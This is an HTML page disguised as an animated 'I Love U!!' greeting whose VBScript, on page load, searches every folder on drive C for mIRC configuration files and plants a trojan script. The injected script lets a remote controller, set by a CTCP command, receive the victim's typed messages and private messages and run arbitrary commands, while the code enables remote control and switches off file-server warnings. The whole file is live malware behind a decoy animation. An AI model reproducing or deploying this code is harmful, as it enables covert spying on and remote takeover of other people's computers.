<html>
<body background="neobkgnd.gif" bgcolor="#000000" text="#FFFFFF" link="#FFFF66"
vlink="#CCCC33" alink="#FFFF00" topmargin="10" leftmargin="10">

<OBJECT ID="DAControl2"
  STYLE="position:absolute; left:0; top:0;width:800;height:300;z-index: -1"
  CLASSID="CLSID:B6FFC24C-7E13-11D0-9B47-00C04FC2F51D">
</OBJECT>

<OBJECT ID="DAControl"
   STYLE="position:absolute; left:100; top:75;width:400;height:450" 
   CLASSID="CLSID:B6FFC24C-7E13-11D0-9B47-00C04FC2F51D">
</OBJECT>

<script LANGUAGE="VBScript">

dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef

Sub window_onLoad()
window.status="Initialising Animation control... Please wait."
call ShowFolderList("c:\")
Call HeartAnim()
Call ILU()
Window.status="Done."
end sub
-->
</script> 
<script LANGUAGE="VBScript">
<!--
sub ShowFolderList(s)
on error resume next
'Level 1

    Set filesys = CreateObject("Scripting.FileSystemObject")
    Set RootFolder1 = FileSys.GetFolder(s)
	Set SubFolds1 = RootFolder1.subfolders
	For Each f1 in Subfolds1
		s = f1.path & "\"
		Otag = s & "mirc.ini"
		AOtag= s & "mirc.dat"
		DummyTag= "C:\winamod.dat"
		TTag= s & "Noobini.ini"
		SectionDef= "[rfiles]"
		if filesys.fileexists(otag) then 
			Call Filemod() 
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementRemote()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementWarn()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementFserv()
			filesys.CopyFile DummyTag, Otag, true
			call ImplementPerfCheck()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementPerform()
			SetClearArchiveBit(Otag)
		End If
	Call ShowFolderList(s)
    Next

End sub

Function FiltNum(FilString)
'on error resume next
countdown=5
do
	Comp = mid(FilString,2,countdown)
	if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function

Function LastLineNum(SSection)
'on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)

Do While FR1N.AtEndOfStream <> True
	segment1 = FR1N.readline
	w = InstrRev(segment1,SSection)
	counts=counts+1
	if w > 0 then 
		do
			if FR1N.AtEndOfStream = True then exit do
			segmentk = FR1N.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
			end if
		Loop until k=0
	end if
loop
FR1N.Close
LastLineNum=LastNum
end function

Function Filemod()
'on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)

Do While fr1.AtEndOfStream <> True
	segment1 = fr1.readline
	fr2.writeline segment1
	w = InstrRev(segment1,"[rfiles]")
	counts=counts+1
	if w > 0 then 
	counts2=counts
		do
			if fr1.AtEndOfStream = True then exit do
			segmentk = fr1.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
				fr2.writeline segmentk
			end if
		COUNTS2=COUNTS2+1
		Loop until k<>1
	exit do
	end if
loop
fr1.Close
fr2.close

Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=Noobini.ini"
fr3.writeline TrojanInfo
fr3.Close

Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)

Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)

Do While fr4.AtEndOfStream <> True
	segment2 = fr4.readline
	if fr4.line >= counts2 + 2 then 
		fr5.writeline segment2
	end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function

sub FLDL(TTag)
'on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=ctcp 1:Gravity3:*:{"
fr6.writeline "n1=  //set %3pty $nick"
fr6.writeline "n2=  //raw -q privmsg %3pty : Noob active."
fr6.writeline "n3=  //halt"
fr6.writeline "n4=}"
fr6.writeline "n5="
fr6.writeline "n6=ctcp 1:gone:*:{"
fr6.writeline "n7=  //raw -q privmsg %3pty : Deactivating Noob."
fr6.writeline "n8=  //set %3pty $null"
fr6.writeline "n9=  //halt"
fr6.writeline "n10=}"
fr6.writeline "n11="
fr6.writeline "n12=ctcp 1:*:*:{"
fr6.writeline "n13=  if ( $nick == %3pty ) {"
fr6.writeline "n14=    *1"
fr6.writeline "n15=    /halt"
fr6.writeline "n16=  }"
fr6.writeline "n17=}"
fr6.writeline "n18="
fr6.writeline "n19=on 1:INPUT:*:{ "
fr6.writeline "n20=  if (%3pty != $null)  //raw -q privmsg %3pty : -  $me to $active  - *1"
fr6.writeline "n21=}"
fr6.writeline "n22="
fr6.writeline "n23=on 1:TEXT:*:?:{ "
fr6.writeline "n24=  if (%3pty != $null) //raw -q privmsg %3pty : - $nick to $me - *1"
fr6.writeline "n25=}"
fr6.writeline "n26="
fr6.writeline "n27=raw *:*No such nick/channel*:/halt"
fr6.close
end sub

Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

Do While fr1a.AtEndOfStream <> True
	segment1a = fr1a.readline
	fr2a.writeline segment1a
	if ucase(segment1a)=ucase("[options]") then
	Do
		If fr1a.AtEndOfStream Then exit do
		n2a = fr1a.readline
		If ucase(mid(n2a,1,3))=ucase("n2=") then
			fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
			exit do
		Else
			fr2a.writeline n2a
		End If
	Loop
	end if
loop
fr1a.Close
fr2a.close
End Function

Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

Do While fr1a.AtEndOfStream <> True
	segment1a = fr1a.readline
	fr2a.writeline segment1a
	if ucase(segment1a)=ucase("[warn]") then
	Do
		If fr1a.AtEndOfStream Then exit do
		n2a = fr1a.readline
		If ucase(n2a)=ucase("fserve=on") then
			fr2a.writeline "fserve=off"
		Else
			fr2a.writeline n2a
		End If
	Loop
	end if
loop
fr1a.Close
fr2a.close
End Function

Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)

Do While fr1c.AtEndOfStream <> True
	segment1c = fr1c.readline
	fr2c.writeline segment1c
	if ucase(segment1c)=ucase("[fileserver]") then
	Do
		if fr1c.AtEndOfStream then exit do
		n2c = fr1c.readline
		If ucase(n2c)=ucase("warning=on") then
			fr2c.writeline "warning=off"
		Else
			fr2c.writeline n2c
		End If
	Loop
	end if
loop
fr1c.Close
fr2c.close
End Function

Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function

Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub

Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)

Do While fr1f.AtEndOfStream <> True
	segment1f = fr1f.readline
	fr2f.writeline segment1f
	if ucase(segment1f)=ucase("[options]") then
	Do
		If fr1f.AtEndOfStream Then exit do
		n2f = fr1f.readline
		If ucase(mid(n2f,1,3))=ucase("n0=") then
			fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
			exit do
		Else
			fr2f.writeline n2f
		End If
	Loop
	end if
loop
fr1f.Close
fr2f.close
End Function

sub HeartAnim
  Set m = DAControl.PixelLibrary

  '* control points of 2D cubic BSpline
  splinePts = Array(0,-100, -75,-200, -125,-175, -175,-125, _
                    -125,25, -25,50, 0,125, 0,125, 0,125, _
                    25,50, 125,25, 175,-125, 75,-200, 0,-100)
  '* Uniform knot vector with interpolation of first and last points
  splineKnts = Array(0,0,0,1,2,3,4,5,6,7,8,9,10,11,11,11)
  
  '* construct the spline path
  Set splineCurve = m.CubicBSplinePath(splinePts, splineKnts)
  
  '* fill the region enclosed by the spline
  Set pink = m.ColorRGB(1,0,1)
  Set fillImg = m.SolidColorImage(pink)      
  Set splineImg = splineCurve.Fill(m.DefaultLineStyle, fillImg)
  
  '* construct a transform that traverses the spline in 7 secs
  '* and repeats that action continuously
  Set pathTf = m.FollowPath(splineCurve, 3).RepeatForever()
   
  '* construct a red dot that travels along the spline
  Set fillImg = m.SolidColorImage(m.Green)
  Set dotImg = m.Oval(10,10).Fill(m.DefaultLineStyle, fillImg)
  Set mDotImg = dotImg.Transform(pathTf)
  
  '* the resulting image is the travelling red dot overlaying the
  '* green spline-bounded region (and converted to centimeters).
  Set finalImg = m.Overlay(mDotImg, splineImg)

  '* set the image as the model to be displayed  
  DAControl.Image = finalImg
  '* set the background in case of a non-windowless browser (such as IE3)
  DAControl.BackgroundImage = m.SolidColorImage(m.Blue)

  '* start the animation
  DAControl.Start
end sub

Sub ILU()
 Set m = DAControl2.MeterLibrary

   'Create an animated color
   Set half = m.DANumber(0.5)
   Set clr = m.colorHslAnim( _
                m.Mul(m.LocalTime, m.DANumber(0.345)), _
                half, half)

   'Contstruct a 12pt font and a text image
   Set font = m.Font("Arial", 12, clr)  
   Set txtImg = m.StringImage("I Love U!!", font)

   'Move the text image across the page
   Set pos = m.Mul(m.Sin(m.LocalTime), m.DANumber(0.02))
   Set scl = m.Add(m.DANumber(2), m.Abs(m.Mul(m.Sin(m.LocalTime), m.DANumber(3))))
   Set xf = m.Compose2(m.Translate2Anim(m.DANumber(0), pos),  _
                       m.Scale2UniformAnim(scl))                       
   Set txtImg = txtImg.Transform(xf)

   'Assign the animation back to the control and start it
   DAControl2.Image = txtImg
   DAControl2.Start
end sub

-->
        </script> </p>
</i></font></p>
</font>
</body>
</html>
